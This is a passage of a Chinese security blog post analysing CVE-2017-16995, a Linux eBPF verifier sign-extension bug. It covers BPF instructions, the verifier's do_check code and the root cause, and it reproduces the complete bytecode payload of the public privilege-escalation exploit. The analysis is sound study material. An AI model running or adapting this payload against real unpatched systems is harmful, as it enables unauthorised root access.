<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CVE-2017-16995 | ph4ntom's blog</title><meta name="keywords" content="binary"><meta name="author" content="ph4ntom"><meta name="copyright" content="ph4ntom"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="深入分析一下CVE-2017-16995漏洞形成过程以及其修复">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2017-16995">
<meta property="og:url" content="https://ph4ntonn.github.io/CVE-2017-16995.html">
<meta property="og:site_name" content="ph4ntom&#39;s blog">
<meta property="og:description" content="深入分析一下CVE-2017-16995漏洞形成过程以及其修复">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
<meta property="article:published_time" content="2021-01-12T04:06:13.000Z">
<meta property="article:modified_time" content="2021-01-12T10:10:02.910Z">
<meta property="article:author" content="ph4ntom">
<meta property="article:tag" content="binary">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ph4ntonn.github.io/CVE-2017-16995"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="rbM4vbAtejyl3i3Ybvi5N-p_l4JJEPEFwc5aqlYCLzo"/><meta name="baidu-site-verification" content="code-Nde8XbsifS"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-01-12 18:10:02'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ph4ntom's blog</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">CVE-2017-16995</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-12T04:06:13.000Z" title="发表于 2021-01-12 12:06:13">2021-01-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-01-12T10:10:02.910Z" title="更新于 2021-01-12 18:10:02">2021-01-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>46分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>CVE-2017-16995是基于ebpf机制的漏洞，漏洞点在于ebpf在虚拟执行时由于错误的符号拓展从而误判执行流程，导致了在实际执行过程中出现预期外的情况。</p>
<p>最近正好也在看内核的代码，所以秉着边分析边学的原则，来详细看看CVE-2017-16995的实现细节</p>
<p>本文参考了一些网上的资料，膜各位dl</p>
<h1 id="什么是bpf"><a href="#什么是bpf" class="headerlink" title="什么是bpf"></a>什么是bpf</h1><p>众所周知，linux的用户层和内核层是隔离的，想让内核执行用户的代码，正常是需要编写内核模块，当然内核模块只能root用户才能加载。而BPF则相当于是内核给用户开的一个绿色通道：BPF（Berkeley Packet Filter）提供了一个用户和内核之间代码和数据传输的桥梁。用户可以用eBPF指令字节码的形式向内核输送代码，并通过事件（如往socket写数据）来触发内核执行用户提供的代码；同时以map（key，value）的形式来和内核共享数据，用户层向map中写数据，内核层从map中取数据，反之亦然。BPF设计初衷是用来在底层对网络进行过滤，后续由于他可以方便的向内核注入代码，并且还提供了一套完整的安全措施来对内核进行保护，被广泛用于抓包、内核probe、性能监控等领域。BPF发展经历了2个阶段，cBPF（classic BPF）和eBPF（extend BPF），cBPF已退出历史舞台，后文提到的BPF默认为eBPF。</p>
<h1 id="bpf指令集"><a href="#bpf指令集" class="headerlink" title="bpf指令集"></a>bpf指令集</h1><p>bpf的指令集类似于虚拟机机制，拥有其单独的一套指令格式及语法</p>
<p>在bpf语法中一共有11个寄存器，分别一一对应机器上的11个物理寄存器，可以从下面看到，r9寄存器并没有被映射，所以bpf语法中函数最多只能有五个参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">R0 – rax</span><br><span class="line">R1 - rdi</span><br><span class="line">R2 - rsi</span><br><span class="line">R3 - rdx</span><br><span class="line">R4 - rcx</span><br><span class="line">R5 - r8</span><br><span class="line">R6 - rbx</span><br><span class="line">R7 - r13</span><br><span class="line">R8 - r14</span><br><span class="line">R9 - r15</span><br><span class="line">R10 – rbp（帧指针，frame pointer）</span><br></pre></td></tr></table></figure>

<p>每一条指令格式都如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct bpf_insn &#123;</span><br><span class="line">    __u8    code;       &#x2F;* opcode *&#x2F;</span><br><span class="line">    __u8    dst_reg:4;  &#x2F;* dest register *&#x2F;</span><br><span class="line">    __u8    src_reg:4;  &#x2F;* source register *&#x2F;</span><br><span class="line">    __s16   off;        &#x2F;* signed offset *&#x2F;</span><br><span class="line">    __s32   imm;        &#x2F;* signed immediate constant *&#x2F;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>打个比方，比如<code>mov eax,0xffffffff</code>这一汇编语句，如果翻译成bpf的语句，那么就是<code>BPF_MOV32_IMM(BPF_REG_2, 0xFFFFFFFF)</code>，<code>BPF_MOV32_IMM</code>指令的数据结构如下(<code>include/linux/filter.h</code>)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#define BPF_MOV32_IMM(DST, IMM)                 \</span><br><span class="line">((struct bpf_insn) &#123;                    \</span><br><span class="line">    .code  &#x3D; BPF_ALU | BPF_MOV | BPF_K,     \</span><br><span class="line">    .dst_reg &#x3D; DST,                 \</span><br><span class="line">    .src_reg &#x3D; 0,                   \</span><br><span class="line">    .off   &#x3D; 0,                 \</span><br><span class="line">    .imm   &#x3D; IMM &#125;)</span><br></pre></td></tr></table></figure>
<p>根据数据结构，可将指令转化为字节码<code>\xb4\x09\x00\x00\xff\xff\xff\xff</code>(相关宏可查看<code>include/uapi/linux/bpf_common.h</code>以及<code>include/uapi/linux/bpf.h</code>)</p>
<h1 id="bpf加载流程"><a href="#bpf加载流程" class="headerlink" title="bpf加载流程"></a>bpf加载流程</h1><p>一个典型的BPF程序流程为：</p>
<ol>
<li><p>用户程序调用syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr))申请创建一个map，在attr结构体中指定map的类型、大小、最大容量等属性。</p>
</li>
<li><p>用户程序调用syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr))来将我们写的BPF代码加载进内核，attr结构体中包含了指令数量、指令首地址指针、日志级别等属性。在加载之前会利用虚拟执行的方式来做安全性校验，这个校验包括对指定语法的检查、指令数量的检查、指令中的指针和立即数的范围及读写权限检查，禁止将内核中的地址暴露给用户空间，禁止对BPF程序stack之外的内核地址读写。安全校验通过后，程序被成功加载至内核，后续真正执行时，不再重复做检查。</p>
</li>
<li><p>用户程序通过调用setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)将我们写的BPF程序绑定到指定的socket上。Progfd为上一步骤的返回值。</p>
</li>
<li><p>用户程序通过操作上一步骤中的socket来触发BPF真正执行。</p>
</li>
</ol>
<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>上面很多知识点大多都是网上资料(笑～)，接下来来详细看看漏洞成因，以下代码均为<code>linux-4.5</code>内核代码</p>
<p>我们先来看看exp中payload的设置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">char *__prog &#x3D;</span><br><span class="line">&#x2F;&#x2F; 漏洞触发阶段payload</span><br><span class="line">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot; &#x2F;&#x2F;BPF_REG_9 &#x3D; 0xffffffff</span><br><span class="line">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot; &#x2F;&#x2F;if BPF_REG_9 &#x3D;&#x3D; -1 &#123;  </span><br><span class="line">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot; &#x2F;&#x2F; BPF_REG_0 &#x3D; 0&#125; </span><br><span class="line">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot; &#x2F;&#x2F; exit(0)</span><br><span class="line">&#x2F;&#x2F; 申请map</span><br><span class="line">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span><br><span class="line">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&#x2F;&#x2F; 漏洞利用阶段payload</span><br><span class="line">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span><br><span class="line">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span><br><span class="line">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span><br><span class="line">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span><br><span class="line">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span><br><span class="line">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span><br><span class="line">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span><br><span class="line">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span><br><span class="line">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span><br><span class="line">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;;</span><br></pre></td></tr></table></figure>
<p>首先，在<code>kernel/bpf/verifier.c</code>中，会对用户请求设置的bpf指令进行验证，实际上就是虚拟执行用户设置的bpf指令，检查其是否存在不合法的操作，如泄露内核栈指针地址，直接的内存读写等，如果存在不合法的操作，那么bpf指令将会被拒绝加载</p>
<p>payload前四行我标出了bpf指令对应的伪代码，我们一行一行来看，这四行就包含了漏洞触发的关键</p>
<p>首先整个payload代码将会经过<code>kernel/bpf/verifier.c</code>中的do_check函数，函数如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line">static int do_check(struct verifier_env *env)</span><br><span class="line">&#123;</span><br><span class="line">    struct verifier_state *state &#x3D; &amp;env-&gt;cur_state;</span><br><span class="line">    struct bpf_insn *insns &#x3D; env-&gt;prog-&gt;insnsi;</span><br><span class="line">    struct reg_state *regs &#x3D; state-&gt;regs;</span><br><span class="line">    int insn_cnt &#x3D; env-&gt;prog-&gt;len;</span><br><span class="line">    int insn_idx, prev_insn_idx &#x3D; 0;</span><br><span class="line">    int insn_processed &#x3D; 0;</span><br><span class="line">    bool do_print_state &#x3D; false;</span><br><span class="line"></span><br><span class="line">    init_reg_state(regs);</span><br><span class="line">    insn_idx &#x3D; 0;</span><br><span class="line">    for (;;) &#123; &#x2F;&#x2F; 通过循环来检查用户设置的每一行bpf指令</span><br><span class="line">        struct bpf_insn *insn;</span><br><span class="line">        u8 class;</span><br><span class="line">        int err;</span><br><span class="line"></span><br><span class="line">        if (insn_idx &gt;&#x3D; insn_cnt) &#123;</span><br><span class="line">            verbose(&quot;invalid insn idx %d insn_cnt %d\n&quot;,</span><br><span class="line">                insn_idx, insn_cnt);</span><br><span class="line">            return -EFAULT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        insn &#x3D; &amp;insns[insn_idx]; &#x2F;&#x2F; 获得一行指令</span><br><span class="line">        class &#x3D; BPF_CLASS(insn-&gt;code); &#x2F;&#x2F; 检查此指令所属的class，BPF_CLASS宏为：#define BPF_CLASS(code) ((code) &amp; 0x07)</span><br><span class="line"></span><br><span class="line">        if (++insn_processed &gt; 32768) &#123; &#x2F;&#x2F; 判断bpf指令数是否过多</span><br><span class="line">            verbose(&quot;BPF program is too large. Proccessed %d insn\n&quot;,</span><br><span class="line">                insn_processed);</span><br><span class="line">            return -E2BIG;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        err &#x3D; is_state_visited(env, insn_idx); &#x2F;&#x2F; 判断是否存在等价状态</span><br><span class="line">        if (err &lt; 0)</span><br><span class="line">            return err;</span><br><span class="line">        if (err &#x3D;&#x3D; 1) &#123;</span><br><span class="line">            &#x2F;* found equivalent state, can prune the search *&#x2F;</span><br><span class="line">            if (log_level) &#123;</span><br><span class="line">                if (do_print_state)</span><br><span class="line">                    verbose(&quot;\nfrom %d to %d: safe\n&quot;,</span><br><span class="line">                        prev_insn_idx, insn_idx);</span><br><span class="line">                else</span><br><span class="line">                    verbose(&quot;%d: safe\n&quot;, insn_idx);</span><br><span class="line">            &#125;</span><br><span class="line">            goto process_bpf_exit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (log_level &amp;&amp; do_print_state) &#123;</span><br><span class="line">            verbose(&quot;\nfrom %d to %d:&quot;, prev_insn_idx, insn_idx);</span><br><span class="line">            print_verifier_state(env);</span><br><span class="line">            do_print_state &#x3D; false;</span><br><span class="line">        &#125;</span><br><span 